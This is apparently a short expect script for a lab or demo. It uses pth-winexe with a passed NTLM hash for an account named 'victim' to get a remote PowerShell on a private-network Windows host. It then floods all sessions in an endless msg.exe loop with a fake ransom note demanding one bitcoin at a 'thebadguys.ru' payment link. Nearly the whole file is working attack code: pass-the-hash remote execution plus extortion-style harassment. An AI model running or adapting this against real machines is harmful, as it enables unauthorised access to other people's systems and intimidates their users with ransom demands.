#!/usr/bin/expect

spawn /usr/bin/pth-winexe -U victim%aad3b435b51404eeaad3b435b51404ee:d00e5d238213d590200fcf3e6f3cd13c //192.168.57.25 --uninstall  powershell.exe
expect "PS"
send "\$message = '_^_^_^_^_^_^_PWWWNNNNNNNNNED!!!!!!!!!_^_^_^_^_^_^_ Your  files are gone. Send 1 bitcoin to this address by tomorrow morning: >>>>>>>>>> http://thebadguys.ru/pay/?c=99247' \n"
send "while (\$true) {msg.exe * \$message} \n"

send "exit \n"

interact
